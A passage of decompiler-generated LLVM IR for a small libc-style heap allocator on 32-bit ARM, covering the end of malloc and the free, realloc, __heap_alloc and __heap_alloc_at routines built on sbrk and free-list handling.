  %v3_126f4 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_238f4.732 to i32*), i32 %v2_126bc)
  store i32 %v3_126f4, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_29d48.728 to i32), i32* %r0.global-to-local, align 4
  store i32 75532, i32* @lr, align 4
  %v1_12708 = call i32 @__pthread_return_0()
  store i32 %v1_12708, i32* %r0.global-to-local, align 4
  %v2_1270c = icmp eq i32 %v3_126f4, 0
  br i1 %v2_1270c, label %dec_label_pc_12714, label %dec_label_pc_127c4

dec_label_pc_12714:                               ; preds = %dec_label_pc_126d0
  %v2_12718 = load i32, i32* @global_var_29d70.579, align 4
  store i32 %v2_12718, i32* @r4, align 4
  %v2_1271c = load i32, i32* %stack_var_-20, align 4
  %v3_12720 = icmp ult i32 %v2_1271c, %v2_12718
  br i1 %v3_12720, label %.thread3, label %bb14

bb14:                                             ; preds = %dec_label_pc_12714
  %v3_12724 = add i32 %v2_12718, -1
  %v2_12728 = add i32 %v3_12724, %v2_1271c
  %v2_1272c = sub i32 0, %v2_12718
  %v3_12730 = and i32 %v2_12728, %v2_1272c
  store i32 %v3_12730, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_12714, %bb14
  store i32 ptrtoint (i32* @global_var_29e38.736 to i32), i32* %r0.global-to-local, align 4
  %v1_1273c = call i32 @__pthread_return_0()
  %v0_12740 = load i32, i32* @r4, align 4
  store i32 %v0_12740, i32* %r0.global-to-local, align 4
  %v1_12744 = call i32 @__GI_sbrk(i32 %v0_12740)
  store i32 %v1_12744, i32* %r0.global-to-local, align 4
  %v7_12748 = icmp eq i32 %v1_12744, -1
  br i1 %v7_12748, label %bb15, label %dec_label_pc_12754

bb15:                                             ; preds = %.thread3
  store i32 %v1_12744, i32* @r5, align 4
  br label %dec_label_pc_12768

dec_label_pc_12754:                               ; preds = %.thread3
  %v1_12754 = add i32 %v1_12744, 3
  %v1_12758 = and i32 %v1_12754, -4
  store i32 %v1_12758, i32* @r5, align 4
  %v9_1275c = icmp eq i32 %v1_12758, %v1_12744
  br i1 %v9_1275c, label %bb17, label %bb16

bb16:                                             ; preds = %dec_label_pc_12754
  %v3_12760 = sub i32 %v1_12758, %v1_12744
  store i32 %v3_12760, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_12754, %bb16
  %v1_12764 = xor i1 %v9_1275c, true
  call void @__pseudo_cond_branch(i1 %v1_12764, i32 ptrtoint (i32* @global_var_13cfc.737 to i32))
  br label %dec_label_pc_12768

dec_label_pc_12768:                               ; preds = %bb15, %bb17
  store i32 ptrtoint (i32* @global_var_29e38.736 to i32), i32* %r0.global-to-local, align 4
  store i32 75640, i32* @lr, align 4
  %v1_12774 = call i32 @__pthread_return_0()
  store i32 %v1_12774, i32* %r0.global-to-local, align 4
  %v0_12778 = load i32, i32* @r5, align 4
  %v7_12778 = icmp eq i32 %v0_12778, -1
  br i1 %v7_12778, label %dec_label_pc_127d4, label %dec_label_pc_12780

dec_label_pc_12780:                               ; preds = %dec_label_pc_12768
  store i32 ptrtoint (i32* @global_var_29d48.728 to i32), i32* %r0.global-to-local, align 4
  %v1_1278c = call i32 @__pthread_return_0()
  %v0_12790 = load i32, i32* @r4, align 4
  %v0_12794 = load i32, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_238f4.732 to i32), i32* %r0.global-to-local, align 4
  %sext = mul i32 %v0_12794, 16777216
  %v2_1279c = sdiv i32 %sext, 16777216
  %v5_1279c = call i32 @__heap_free(i32* bitcast (i32** @global_var_238f4.732 to i32*), i32 %v2_1279c, i32 %v0_12790)
  store i32 ptrtoint (i32** @global_var_238f4.732 to i32), i32* %r0.global-to-local, align 4
  %v3_127a8 = call i32 @__heap_alloc(i32* bitcast (i32** @global_var_238f4.732 to i32*), i32 %v2_126bc)
  store i32 %v3_127a8, i32* %r4.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_29d48.728 to i32), i32* %r0.global-to-local, align 4
  store i32 75708, i32* @lr, align 4
  %v1_127b8 = call i32 @__pthread_return_0()
  store i32 %v1_127b8, i32* %r0.global-to-local, align 4
  %v2_127bc = icmp eq i32 %v3_127a8, 0
  br i1 %v2_127bc, label %dec_label_pc_127d4, label %dec_label_pc_127c4

dec_label_pc_127c4:                               ; preds = %dec_label_pc_126d0, %dec_label_pc_12780
  %v1_127c8 = phi i32 [ %v3_126f4, %dec_label_pc_126d0 ], [ %v3_127a8, %dec_label_pc_12780 ]
  %v2_127c4 = load i32, i32* %stack_var_-20, align 4
  %v2_127c8 = inttoptr i32 %v1_127c8 to i32*
  store i32 %v2_127c4, i32* %v2_127c8, align 4
  %v3_127c8 = load i32, i32* %r4.global-to-local, align 4
  %v4_127c8 = add i32 %v3_127c8, 4
  store i32 %v4_127c8, i32* %r4.global-to-local, align 4
  %v2_127cc = icmp eq i32 %v4_127c8, 0
  br i1 %v2_127cc, label %dec_label_pc_127d4, label %dec_label_pc_127e4

dec_label_pc_127d4:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_12780, %dec_label_pc_12768, %dec_label_pc_126c8
  %v0_127d4 = call i32 @__errno_location()
  store i32 %v0_127d4, i32* %r0.global-to-local, align 4
  %v2_127dc = inttoptr i32 %v0_127d4 to i32*
  store i32 12, i32* %v2_127dc, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_127e4

dec_label_pc_127e4:                               ; preds = %dec_label_pc_127c4, %dec_label_pc_127d4
  %v0_127e4 = phi i32 [ %v4_127c8, %dec_label_pc_127c4 ], [ 0, %dec_label_pc_127d4 ]
  store i32 %v0_127e4, i32* %r0.global-to-local, align 4
  store i32 %v3_126b4, i32* @r4, align 4
  store i32 %v6_126b4, i32* @r5, align 4
  store i32 %v9_126b4, i32* @r6, align 4
  ret i32 %v0_127e4

; uselistorder directives
  uselistorder i32 %v0_127e4, { 1, 0 }
  uselistorder i32 %v3_127a8, { 1, 0, 2 }
  uselistorder i32 %v1_12758, { 1, 0, 2 }
  uselistorder i32 %v1_12744, { 3, 0, 2, 4, 1, 5 }
  uselistorder i32 %v3_126f4, { 1, 0, 2 }
  uselistorder i32 %v0_126b8, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 6, 7, 8, 9, 11, 10, 15, 13, 12, 17, 14, 16, 18, 19, 0, 1 }
  uselistorder label %dec_label_pc_127e4, { 1, 0 }
  uselistorder label %dec_label_pc_127c4, { 1, 0 }
  uselistorder label %dec_label_pc_12768, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_126d0, { 1, 0 }
}

define i32 @free() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_12808 = load i32, i32* @r0, align 4
  %v2_12808 = icmp eq i32 %v0_12808, 0
  %v3_1280c = load i32, i32* @r4, align 4
  store i32 %v3_1280c, i32* %stack_var_-24, align 4
  %v6_1280c = load i32, i32* @r5, align 4
  %v9_1280c = load i32, i32* @r6, align 4
  %v15_1280c = load i32, i32* @r8, align 4
  br i1 %v2_12808, label %bb, label %bb11

bb:                                               ; preds = %entry
  ret i32 0

bb11:                                             ; preds = %entry
  %v1_12814 = add i32 %v0_12808, -4
  %v2_12814 = inttoptr i32 %v1_12814 to i32*
  %v3_12814 = load i32, i32* %v2_12814, align 4
  store i32 %v3_12814, i32* @r5, align 4
  store i32 ptrtoint (i32** @global_var_238f4.732 to i32), i32* %r8.global-to-local, align 4
  store i32 %v1_12814, i32* @r4, align 4
  %v1_1282c = call i32 @__pthread_return_0()
  %v0_12830 = load i32, i32* @r4, align 4
  %v0_12834 = load i32, i32* @r5, align 4
  %v4_1283c = call i32 @__heap_free(i32* bitcast (i32** @global_var_238f4.732 to i32*), i32 %v0_12830, i32 %v0_12834)
  %v1_12844 = inttoptr i32 %v4_1283c to i32*
  %v2_12844 = load i32, i32* %v1_12844, align 4
  store i32 %v2_12844, i32* %r6.global-to-local, align 4
  %v2_12848 = load i32, i32* @global_var_29d70.579, align 4
  %v4_1284c = mul i32 %v2_12848, 8
  %v6_1284c = icmp ult i32 %v2_12844, %v4_1284c
  store i32 %v4_1283c, i32* @r4, align 4
  br i1 %v6_1284c, label %dec_label_pc_1288c, label %dec_label_pc_12858

dec_label_pc_12858:                               ; preds = %bb11
  %v1_12860 = call i32 @__pthread_return_0()
  %v1_12868 = call i32 @__GI_sbrk(i32 0)
  %v0_1286c = load i32, i32* @r4, align 4
  %v1_1286c = add i32 %v0_1286c, 12
  store i32 %v1_1286c, i32* @r5, align 4
  %v9_12870 = icmp eq i32 %v1_1286c, %v1_12868
  br i1 %v9_12870, label %dec_label_pc_12894, label %dec_label_pc_12878

dec_label_pc_12878:                               ; preds = %dec_label_pc_12858
  %v1_12884 = call i32 @__pthread_return_0()
  br label %dec_label_pc_1288c

dec_label_pc_1288c:                               ; preds = %bb11, %dec_label_pc_12878, %bb14
  %v2_1288c = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_1288c, i32* @r4, align 4
  store i32 %v6_1280c, i32* @r5, align 4
  store i32 %v9_1280c, i32* %r6.global-to-local, align 4
  store i32 %v15_1280c, i32* %r8.global-to-local, align 4
  %v0_12890 = call i32 @__pthread_return_0()
  %v0_12894.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12894

dec_label_pc_12894:                               ; preds = %dec_label_pc_12858, %dec_label_pc_1288c
  %v1_1289c = phi i32 [ %v0_1286c, %dec_label_pc_12858 ], [ %v0_12894.pre, %dec_label_pc_1288c ]
  %v1_12894 = add i32 %v1_1289c, 4
  %v2_12894 = inttoptr i32 %v1_12894 to i32*
  %v3_12894 = load i32, i32* %v2_12894, align 4
  %v2_12898 = icmp eq i32 %v3_12894, 0
  br i1 %v2_12898, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_12894
  %v2_1289c = add i32 %v1_1289c, 8
  %v3_1289c = inttoptr i32 %v2_1289c to i32*
  %v4_1289c = load i32, i32* %v3_1289c, align 4
  %v3_128a0 = add i32 %v3_12894, 8
  %v4_128a0 = inttoptr i32 %v3_128a0 to i32*
  store i32 %v4_1289c, i32* %v4_128a0, align 4
  %v0_128a4.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_12894, %bb12
  %v0_128a4 = phi i32 [ %v1_1289c, %dec_label_pc_12894 ], [ %v0_128a4.pre, %bb12 ]
  %v1_128a4 = add i32 %v0_128a4, 8
  %v2_128a4 = inttoptr i32 %v1_128a4 to i32*
  %v3_128a4 = load i32, i32* %v2_128a4, align 4
  %v1_128a8 = add i32 %v0_128a4, 4
  %v2_128a8 = inttoptr i32 %v1_128a8 to i32*
  %v3_128a8 = load i32, i32* %v2_128a8, align 4
  %v2_128ac = icmp eq i32 %v3_128a4, 0
  br i1 %v2_128ac, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_128b0 = add i32 %v3_128a4, 4
  %v4_128b0 = inttoptr i32 %v3_128b0 to i32*
  store i32 %v3_128a8, i32* %v4_128b0, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_128b4 = load i32, i32* %r8.global-to-local, align 4
  %v3_128b4 = inttoptr i32 %v2_128b4 to i32*
  store i32 %v3_128a8, i32* %v3_128b4, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_128c4 = call i32 @__pthread_return_0()
  %v0_128c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_128c8 = load i32, i32* @r4, align 4
  %v0_128d0 = load i32, i32* @r5, align 4
  %v2_128c8 = sub i32 12, %v0_128c8
  %v1_128cc = add i32 %v2_128c8, %v1_128c8
  %v2_128d0 = sub i32 %v1_128cc, %v0_128d0
  %v1_128d4 = call i32 @__GI_sbrk(i32 %v2_128d0)
  br label %dec_label_pc_1288c

; uselistorder directives
  uselistorder i32 %v0_128a4, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_12894, { 1, 0 }
  uselistorder label %dec_label_pc_1288c, { 2, 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_128f8 = load i32, i32* @r4, align 4
  store i32 %v3_128f8, i32* %stack_var_-24, align 4
  %v6_128f8 = load i32, i32* @r5, align 4
  %v9_128f8 = load i32, i32* @r6, align 4
  %v12_128f8 = load i32, i32* @r7, align 4
  %v15_128f8 = load i32, i32* @r8, align 4
  %v18_128f8 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r4, align 4
  %v2_128fc = icmp eq i32 %arg2, 0
  %v0_12900 = load i32, i32* @r0, align 4
  store i32 %v0_12900, i32* @r7, align 4
  br i1 %v2_128fc, label %dec_label_pc_12908, label %dec_label_pc_12910

dec_label_pc_12908:                               ; preds = %entry
  %v0_12908 = call i32 @free()
  %v0_12918.pre = load i32, i32* @r4, align 4
  %v2_1291c.pre = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_12918

dec_label_pc_12910:                               ; preds = %entry
  %v2_12910 = icmp eq i32 %v0_12900, 0
  br i1 %v2_12910, label %dec_label_pc_12918, label %dec_label_pc_12924

dec_label_pc_12918:                               ; preds = %dec_label_pc_12910, %dec_label_pc_12908
  %v2_1291c = phi i32 [ %v3_128f8, %dec_label_pc_12910 ], [ %v2_1291c.pre, %dec_label_pc_12908 ]
  %v0_12918 = phi i32 [ %arg2, %dec_label_pc_12910 ], [ %v0_12918.pre, %dec_label_pc_12908 ]
  store i32 %v2_1291c, i32* @r4, align 4
  store i32 %v6_128f8, i32* @r5, align 4
  store i32 %v9_128f8, i32* @r6, align 4
  store i32 %v12_128f8, i32* @r7, align 4
  store i32 %v18_128f8, i32* @lr, align 4
  %v1_12920 = call i32 @malloc(i32 %v0_12918)
  %v0_12924.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_12924

dec_label_pc_12924:                               ; preds = %dec_label_pc_12910, %dec_label_pc_12918
  %v0_1293c = phi i32 [ %v0_12900, %dec_label_pc_12910 ], [ %v1_12920, %dec_label_pc_12918 ]
  %v0_12924 = phi i32 [ %arg2, %dec_label_pc_12910 ], [ %v0_12924.pre, %dec_label_pc_12918 ]
  %v1_12924 = add i32 %v0_12924, 7
  %v1_12928 = and i32 %v1_12924, -4
  store i32 %v1_12928, i32* @r5, align 4
  %v2_1292c = icmp ugt i32 %v1_12928, 10
  %v1_12930 = add i32 %v0_1293c, -4
  %v2_12930 = inttoptr i32 %v1_12930 to i32*
  %v3_12930 = load i32, i32* %v2_12930, align 4
  store i32 %v3_12930, i32* @r6, align 4
  br i1 %v2_1292c, label %bb14, label %bb

bb:                                               ; preds = %dec_label_pc_12924
  store i32 12, i32* @r5, align 4
  br label %bb14

bb14:                                             ; preds = %dec_label_pc_12924, %bb
  %v0_129b8 = phi i32 [ %v1_12928, %dec_label_pc_12924 ], [ 12, %bb ]
  store i32 %v1_12930, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_129b8, %v3_12930
  br i1 %tmp, label %dec_label_pc_12944, label %dec_label_pc_129b8

dec_label_pc_12944:                               ; preds = %bb14
  %v2_12938 = sub i32 %v0_129b8, %v3_12930
  %v1_12954 = call i32 @__pthread_return_0()
  %v0_1295c = load i32, i32* @r8, align 4
  %v1_1295c = load i32, i32* @r6, align 4
  %v2_1295c = add i32 %v1_1295c, %v0_1295c
  %v4_12964 = call i32 @__heap_alloc_at(i32* bitcast (i32** @global_var_238f4.732 to i32*), i32 %v2_1295c, i32 %v2_12938)
  store i32 %v4_12964, i32* @r4, align 4
  store i32 76156, i32* @lr, align 4
  %v1_12978 = call i32 @__pthread_return_0()
  %v0_1297c = load i32, i32* @r4, align 4
  %v2_1297c = icmp eq i32 %v0_1297c, 0
  br i1 %v2_1297c, label %dec_label_pc_1298c, label %.thread

.thread:                                          ; preds = %dec_label_pc_12944
  %v1_12980 = load i32, i32* @r6, align 4
  %v3_12980 = add i32 %v1_12980, %v0_1297c
  %v2_12984 = load i32, i32* @r7, align 4
  %v3_12984 = add i32 %v2_12984, -4
  %v4_12984 = inttoptr i32 %v3_12984 to i32*
  store i32 %v3_12980, i32* %v4_12984, align 4
  br label %dec_label_pc_129f8

dec_label_pc_1298c:                               ; preds = %dec_label_pc_12944
  %v0_1298c = load i32, i32* @r5, align 4
  %v1_1298c = add i32 %v0_1298c, -4
  %v1_12990 = call i32 @malloc(i32 %v1_1298c)
  store i32 %v1_12990, i32* @r0, align 4
  store i32 %v1_12990, i32* @r4, align 4
  %v2_12994 = icmp eq i32 %v1_12990, 0
  br i1 %v2_12994, label %dec_label_pc_129b0, label %dec_label_pc_1299c

dec_label_pc_1299c:                               ; preds = %dec_label_pc_1298c
  %v0_1299c = load i32, i32* @r6, align 4
  %v1_1299c = add i32 %v0_1299c, -4
  store i32 %v1_1299c, i32* @r2, align 4
  %v0_129a0 = load i32, i32* @r7, align 4
  store i32 %v0_129a0, i32* @r1, align 4
  %v0_129a4 = call i32 @memcpy()
  %v0_129a8 = load i32, i32* @r7, align 4
  store i32 %v0_129a8, i32* @r0, align 4
  %v0_129ac = call i32 @free()
  %v0_129b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_129b0

dec_label_pc_129b0:                               ; preds = %dec_label_pc_1298c, %dec_label_pc_1299c
  %v0_129b0 = phi i32 [ 0, %dec_label_pc_1298c ], [ %v0_129b0.pre, %dec_label_pc_1299c ]
  store i32 %v0_129b0, i32* @r7, align 4
  br label %dec_label_pc_129f8

dec_label_pc_129b8:                               ; preds = %bb14
  %v1_129b8 = add i32 %v0_129b8, 28
  %tmp15 = icmp ugt i32 %v1_129b8, %v3_12930
  br i1 %tmp15, label %dec_label_pc_129f8, label %dec_label_pc_129c4

dec_label_pc_129c4:                               ; preds = %dec_label_pc_129b8
  %v1_129d0 = call i32 @__pthread_return_0()
  %v0_129d4 = load i32, i32* @r8, align 4
  %v1_129d4 = load i32, i32* @r5, align 4
  %v2_129d4 = add i32 %v1_129d4, %v0_129d4
  %v1_129d8 = load i32, i32* @r6, align 4
  %v2_129d8 = sub i32 %v1_129d8, %v1_129d4
  %v4_129e0 = call i32 @__heap_free(i32* bitcast (i32** @global_var_238f4.732 to i32*), i32 %v2_129d4, i32 %v2_129d8)
  store i32 76276, i32* @lr, align 4
  %v1_129f0 = call i32 @__pthread_return_0()
  %v0_129f4 = load i32, i32* @r5, align 4
  %v1_129f4 = load i32, i32* @r7, align 4
  %v2_129f4 = add i32 %v1_129f4, -4
  %v3_129f4 = inttoptr i32 %v2_129f4 to i32*
  store i32 %v0_129f4, i32* %v3_129f4, align 4
  br label %dec_label_pc_129f8

dec_label_pc_129f8:                               ; preds = %.thread, %dec_label_pc_129b8, %dec_label_pc_129b0, %dec_label_pc_129c4
  %v0_129f8 = load i32, i32* @r7, align 4
  store i32 %v9_128f8, i32* @r6, align 4
  store i32 %v15_128f8, i32* @r8, align 4
  ret i32 %v0_129f8

; uselistorder directives
  uselistorder i32 %v1_129d4, { 1, 0 }
  uselistorder i32 %v0_129b8, { 1, 2, 0 }
  uselistorder i32 %v3_12930, { 0, 2, 1, 3 }
  uselistorder i32** @global_var_238f4.732, { 1, 0 }
  uselistorder i32* bitcast (i32** @global_var_238f4.732 to i32*), { 1, 2, 0, 3, 4, 5 }
  uselistorder label %dec_label_pc_129f8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_129b0, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_12924, { 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_12a10 = inttoptr i32 %arg2 to i32*
  %v2_12a10 = load i32, i32* %v1_12a10, align 4
  %v3_12a14 = load i32, i32* @r4, align 4
  store i32 %v3_12a14, i32* %stack_var_-8, align 4
  %v1_12a18 = add i32 %v2_12a10, 3
  %v1_12a1c = and i32 %v1_12a18, -4
  store i32 %v1_12a1c, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_12a24 = icmp ugt i32 %v1_12a1c, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_12a2c = load i32, i32* %arg1, align 4
  store i32 %v2_12a2c, i32* %r0.global-to-local, align 4
  br i1 %v2_12a24, label %dec_label_pc_12a98.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_12a98.preheader

dec_label_pc_12a98.preheader:                     ; preds = %entry, %bb
  %v1_12a4c = phi i32 [ %v1_12a1c, %entry ], [ 12, %bb ]
  %v2_12a989 = icmp eq i32 %v2_12a2c, 0
  br i1 %v2_12a989, label %dec_label_pc_12aa0, label %dec_label_pc_12a38

dec_label_pc_12a38:                               ; preds = %dec_label_pc_12a98.preheader, %dec_label_pc_12a94
  %v2_12a50 = phi i32 [ %v3_12a94, %dec_label_pc_12a94 ], [ %v2_12a2c, %dec_label_pc_12a98.preheader ]
  %v1_12a38 = inttoptr i32 %v2_12a50 to i32*
  %v2_12a38 = load i32, i32* %v1_12a38, align 4
  store i32 %v2_12a38, i32* @ip, align 4
  %v3_12a3c = icmp ult i32 %v2_12a38, %v1_12a4c
  br i1 %v3_12a3c, label %dec_label_pc_12a94, label %dec_label_pc_12a44

dec_label_pc_12a44:                               ; preds = %dec_label_pc_12a38
  %v1_12a44 = add i32 %v1_12a4c, 44
  %v3_12a48 = icmp ult i32 %v2_12a38, %v1_12a44
  br i1 %v3_12a48, label %dec_label_pc_12a58, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_12a44
  %v2_12a3c.le = sub i32 %v2_12a38, %v1_12a4c
  store i32 %v2_12a3c.le, i32* %v1_12a38, align 4
  %v0_12a84.pre = load i32, i32* @ip, align 4
  %v0_12a8c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_12a58:                               ; preds = %dec_label_pc_12a44
  %v1_12a58 = add i32 %v2_12a50, 4
  %v2_12a58 = inttoptr i32 %v1_12a58 to i32*
  %v3_12a58 = load i32, i32* %v2_12a58, align 4
  store i32 %v3_12a58, i32* %r2.global-to-local, align 4
  %v2_12a5c = icmp eq i32 %v3_12a58, 0
  br i1 %v2_12a5c, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_12a58
  %v2_12a60 = add i32 %v2_12a50, 8
  %v3_12a60 = inttoptr i32 %v2_12a60 to i32*
  %v4_12a60 = load i32, i32* %v3_12a60, align 4
  %v3_12a64 = add i32 %v3_12a58, 8
  %v4_12a64 = inttoptr i32 %v3_12a64 to i32*
  store i32 %v4_12a60, i32* %v4_12a64, align 4
  %v0_12a68.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_12a58, %bb27
  %v0_12a68 = phi i32 [ %v2_12a50, %dec_label_pc_12a58 ], [ %v0_12a68.pre, %bb27 ]
  %v1_12a68 = add i32 %v0_12a68, 8
  %v2_12a68 = inttoptr i32 %v1_12a68 to i32*
  %v3_12a68 = load i32, i32* %v2_12a68, align 4
  %v1_12a6c = add i32 %v0_12a68, 4
  %v2_12a6c = inttoptr i32 %v1_12a6c to i32*
  %v3_12a6c = load i32, i32* %v2_12a6c, align 4
  %v2_12a70 = icmp eq i32 %v3_12a68, 0
  br i1 %v2_12a70, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_12a74 = add i32 %v3_12a68, 4
  %v4_12a74 = inttoptr i32 %v3_12a74 to i32*
  store i32 %v3_12a6c, i32* %v4_12a74, align 4
  %v1_12a7c = load i32, i32* @ip, align 4
  store i32 %v1_12a7c, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_12a78 = load i32, i32* %r1.global-to-local, align 4
  %v3_12a78 = inttoptr i32 %v2_12a78 to i32*
  store i32 %v3_12a6c, i32* %v3_12a78, align 4
  %v1_12a80.pre = load i32, i32* @ip, align 4
  store i32 %v1_12a80.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_12a8c = phi i32 [ %v0_12a8c.pre, %.thread._crit_edge ], [ %v1_12a7c, %bb28 ], [ %v1_12a80.pre, %.thread5 ]
  %v0_12a84 = phi i32 [ %v0_12a84.pre, %.thread._crit_edge ], [ %v1_12a7c, %bb28 ], [ %v1_12a80.pre, %.thread5 ]
  %v1_12a84 = load i32, i32* %r0.global-to-local, align 4
  %v2_12a84 = sub i32 %v1_12a84, %v0_12a84
  %v1_12a88 = add i32 %v2_12a84, 12
  store i32 %v1_12a88, i32* %r0.global-to-local, align 4
  %v1_12a8c = load i32, i32* %r4.global-to-local, align 4
  %v2_12a8c = inttoptr i32 %v1_12a8c to i32*
  store i32 %v0_12a8c, i32* %v2_12a8c, align 4
  %v2_12a90 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12a90, i32* %r4.global-to-local, align 4
  ret i32 %v1_12a88

dec_label_pc_12a94:                               ; preds = %dec_label_pc_12a38
  %v1_12a94 = add i32 %v2_12a50, 4
  %v2_12a94 = inttoptr i32 %v1_12a94 to i32*
  %v3_12a94 = load i32, i32* %v2_12a94, align 4
  store i32 %v3_12a94, i32* %r0.global-to-local, align 4
  %v2_12a98 = icmp eq i32 %v3_12a94, 0
  br i1 %v2_12a98, label %dec_label_pc_12a98.dec_label_pc_12aa0_crit_edge, label %dec_label_pc_12a38

dec_label_pc_12a98.dec_label_pc_12aa0_crit_edge:  ; preds = %dec_label_pc_12a94
  br label %dec_label_pc_12aa0

dec_label_pc_12aa0:                               ; preds = %dec_label_pc_12a98.dec_label_pc_12aa0_crit_edge, %dec_label_pc_12a98.preheader
  store i32 %v3_12a14, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_12a94, { 1, 2, 0 }
  uselistorder i32 %v0_12a68, { 1, 0 }
  uselistorder i32 %v2_12a38, { 1, 0, 2, 3 }
  uselistorder i32 %v2_12a50, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_12a4c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_12a38, { 1, 0 }
  uselistorder label %dec_label_pc_12a98.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_12aa8 = load i32, i32* %arg1, align 4
  store i32 %v2_12aa8, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_12b206 = icmp eq i32 %v2_12aa8, 0
  br i1 %v2_12b206, label %dec_label_pc_12b28, label %dec_label_pc_12ab4

dec_label_pc_12ab4:                               ; preds = %entry, %dec_label_pc_12b1c
  %v0_12af4 = phi i32 [ %v3_12b1c, %dec_label_pc_12b1c ], [ %v2_12aa8, %entry ]
  %v1_12ab4 = inttoptr i32 %v0_12af4 to i32*
  %v2_12ab4 = load i32, i32* %v1_12ab4, align 4
  store i32 %v2_12ab4, i32* %r0.global-to-local, align 4
  %v2_12ab8 = sub i32 %v0_12af4, %v2_12ab4
  %v1_12abc = add i32 %v2_12ab8, 12
  %v3_12ac0 = icmp uge i32 %v1_12abc, %arg2
  %v9_12ac0 = icmp eq i32 %v1_12abc, %arg2
  %v2_12ac4 = xor i1 %v9_12ac0, true
  %v3_12ac4 = and i1 %v3_12ac0, %v2_12ac4
  br i1 %v3_12ac4, label %dec_label_pc_12b1c, label %dec_label_pc_12ac8

dec_label_pc_12ac8:                               ; preds = %dec_label_pc_12ab4
  br i1 %v9_12ac0, label %dec_label_pc_12acc, label %dec_label_pc_12b28

dec_label_pc_12acc:                               ; preds = %dec_label_pc_12ac8
  %v1_12acc = add i32 %arg3, 3
  %v1_12ad0 = and i32 %v1_12acc, -4
  store i32 %v1_12ad0, i32* %r2.global-to-local, align 4
  %v2_12ad4 = sub i32 %v2_12ab4, %v1_12ad0
  %v3_12ad4 = icmp ult i32 %v2_12ab4, %v1_12ad0
  br i1 %v3_12ad4, label %dec_label_pc_12b28, label %dec_label_pc_12adc

